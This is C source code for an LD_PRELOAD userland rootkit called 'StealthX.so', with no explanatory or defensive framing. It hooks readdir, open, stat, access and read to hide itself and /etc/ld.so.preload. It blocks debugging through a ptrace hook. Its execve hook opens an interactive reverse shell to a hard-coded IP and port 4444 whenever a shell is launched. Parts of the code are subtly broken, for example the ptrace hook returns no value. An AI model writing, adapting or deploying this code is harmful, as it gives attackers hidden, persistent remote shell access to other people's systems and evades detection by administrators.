#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <sys/ptrace.h>
#include <stdarg.h>

#define ANTI_DEBUG_MSG "Access denied. Unauthorized debugging attempt detected!\n"
#define ROOTKIT_NAME "StealthX.so"
#define HIDDEN_FILE "/etc/ld.so.preload"
#define REVERSE_SHELL_IP "10.17.68.193"
#define REVERSE_SHELL_PORT 4444

static int (*o_execve)(const char *, char *const[], char *const[]);
static int (*o_open)(const char *, int, ...);
static int (*o_stat)(const char *, struct stat *);
static int (*o_access)(const char *, int);
static ssize_t (*o_read)(int, void *, size_t);
static long (*original_ptrace)(enum __ptrace_request, ...);
struct dirent *(*original_readdir)(DIR *) = NULL;

// Hide rootkit file
struct dirent *readdir(DIR *dirp) {
    if (!original_readdir)
        original_readdir = (struct dirent *(*)(DIR *)) dlsym(RTLD_NEXT, "readdir");
    struct dirent *ep = original_readdir(dirp);
    while (ep && strstr(ep->d_name, ROOTKIT_NAME))
        ep = original_readdir(dirp);
    return ep;
}

// Anti-debugging mechanism
void anti_debug_exit() {
    write(STDERR_FILENO, ANTI_DEBUG_MSG, strlen(ANTI_DEBUG_MSG));
    exit(-1);
}

// Hook ptrace to prevent debugging
long ptrace(enum __ptrace_request request, ...) {
    if (request == PTRACE_TRACEME) {
        anti_debug_exit();
    }
    if (!original_ptrace)
        original_ptrace = dlsym(RTLD_NEXT, "ptrace");
    va_list args;
    va_start(args, request);
    long result = original_ptrace(request, args);
    va_end(args);

}

// Reverse shell connection
void reverse_shell() {
    int sockfd;
    struct sockaddr_in srv;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return;
    srv.sin_family = AF_INET;
    srv.sin_port = htons(REVERSE_SHELL_PORT);
    srv.sin_addr.s_addr = inet_addr(REVERSE_SHELL_IP);
    if (connect(sockfd, (struct sockaddr *)&srv, sizeof(srv)) == 0) {
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execl("/bin/sh", "sh", "-i", NULL);
    }
    close(sockfd);
}

// Hook execve to trigger reverse shell
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    if (!o_execve)
        o_execve = dlsym(RTLD_NEXT, "execve");
    if (strstr(pathname, "/bin/bash") || strstr(pathname, "/bin/sh"))
        reverse_shell();
    return o_execve(pathname, argv, envp);
}

// Hook open to hide specific files
int open(const char *pathname, int flags, ...) {
    if (!o_open)
        o_open = dlsym(RTLD_NEXT, "open");
    if (strstr(pathname, HIDDEN_FILE)) {
        errno = ENOENT;
        return -1;
    }
    va_list args;
    va_start(args, flags);
    int mode = va_arg(args, int);
    va_end(args);    return o_open(pathname, flags, mode);
}

// Hook stat to hide specific files
int stat(const char *pathname, struct stat *buf) {
    if (!o_stat)
        o_stat = dlsym(RTLD_NEXT, "stat");
    if (strstr(pathname, HIDDEN_FILE)) {
        errno = ENOENT;
        return -1;
    }
    return o_stat(pathname, buf);
}

// Hook access to hide specific files
int access(const char *pathname, int mode) {
    if (!o_access)
        o_access = dlsym(RTLD_NEXT, "access");
    if (strstr(pathname, HIDDEN_FILE)) {
        errno = ENOENT;
        return -1;
    }
    return o_access(pathname, mode);
}

// Hook read to prevent detection
ssize_t read(int fd, void *buf, size_t count) {
    if (!o_read)
        o_read = dlsym(RTLD_NEXT, "read");
    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char realpath_buf[256];
    if (readlink(path, realpath_buf, sizeof(realpath_buf) - 1) != -1) {
        realpath_buf[sizeof(realpath_buf) - 1] = '\0';
        if (strstr(realpath_buf, HIDDEN_FILE)) {
            errno = ENOENT;
            return -1;
        }
    }
    return o_read(fd, buf, count);
}
